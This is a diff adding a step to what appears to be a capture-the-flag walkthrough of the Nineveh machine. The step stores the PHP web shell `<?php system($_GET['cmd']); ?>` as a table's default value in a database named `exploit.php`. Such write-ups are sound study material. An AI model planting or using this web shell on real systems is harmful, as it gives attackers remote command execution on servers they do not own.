@@ -384,3 +384,26 @@ In this case, we will create one named `exploit.php`:
 ![10](../../../assets/images/Nineveh/10.png)
 
 <br />
+
+2.- Create a new table in our database with our malicious php code:.
+
+<br />
+
+The table only need one field:
+
+<br />
+
+
+
+<br />
+
+Now we select the `"Type"` text, and enter the php code into the `"Default Value"` field:
+
+<br />
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+
+<br />
